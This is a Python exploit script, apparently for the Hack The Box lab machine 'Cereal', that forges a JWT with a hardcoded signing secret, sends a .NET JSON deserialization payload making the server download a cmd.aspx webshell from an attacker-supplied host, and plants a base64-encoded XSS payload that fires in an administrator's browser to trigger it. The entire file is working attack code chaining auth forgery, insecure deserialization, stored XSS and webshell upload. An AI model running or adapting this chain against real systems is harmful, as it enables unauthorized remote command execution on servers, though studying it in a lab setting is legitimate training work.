import requests
import urllib3
from urllib.parse import urljoin
import base64
import argparse
import traceback
import jwt # type: ignore
import time
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(category=InsecureRequestWarning)

def CreateJWT():
    print("[*] Creating JWT...")
    epoch = int(time.time())
    exp = epoch + 86400
    key = "secretlhfIH&FY*#oysuflkhskjfhefesf"
    encoded = jwt.encode({"unique_name":"1","nbf":epoch,"exp":exp,"iat":epoch}, key, algorithm="HS256")
    jwt.decode(encoded, key, algorithms="HS256")
    print(f"[+] JWT: {encoded}")
    return encoded

def TriggerXSS(lhost):
    """
    for the script to upload the webshell, you must:
    - host https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/FuzzDB/cmd.aspx on a Python server running on port 80
    """
    url = "https://cereal.htb/requests"
    jwt = CreateJWT()
    headers = {"Authorization": f"Bearer {jwt}"}
    payload = {"json": "{'$type': 'Cereal.DownloadHelper, Cereal', 'URL': 'http://%s/cmd.aspx', 'FilePath': 'C:/inetpub/source/uploads/cmd.aspx'}" % (lhost)}
    try: 
        resp = requests.post(url, json=payload, headers=headers, verify=False)
        resp = resp.json()
        cereal_id = resp['id']
        print(f"[+] Malicious Serialized object sent successfully. Cereal id: {cereal_id}")
    except Exception as e:
        print("[-] Failed to send the Malicious Serialized object to the server: ", e)
        traceback.print_exc()

    js_payload = "var req = new XMLHttpRequest();"
    js_payload += f"req.open('GET', 'https://cereal.htb/requests/{cereal_id}');"
    js_payload += f"req.setRequestHeader('Authorization', 'Bearer {jwt}');"
    js_payload += "req.send();"
    js_payload = js_payload.encode()

    b64_js_payload = base64.b64encode(js_payload).decode()
    xss = {"json": f'{{"title":"[XSS](javascript: eval%28atob%28%22{b64_js_payload}%22%29%29)","flavor":"meat","color":"#000000", "description":"helloWorld!"}}'}
    try:
        print("[*] Sending the XSS payload to the server...")
        resp = requests.post(url, json=xss, headers=headers, verify=False)
        print(f"XSS payload sent: {js_payload}")
        if "Great cereal request!" in resp.text:
            print("[+] XSS payload sent successfully.")
            print("[*] Please wait till the XSS payload fires in the admin's browser, it usually takes 2 to 3 minutes...")
            time.sleep(3 * 60)
            print("[+] Please access your webshell at https://source.cereal.htb/uploads/cmd.aspx")
    except Exception as e:
        print("[-] Failed to send the XSS payload: ", e)
        traceback.print_exc()


def main():
    parser = argparse.ArgumentParser(description="Upload a webshell on the traget machine.")
    parser.add_argument("lhost", help="Attacker IP address")
    args = parser.parse_args()
    TriggerXSS(args.lhost)

if __name__ == "__main__":
    main()
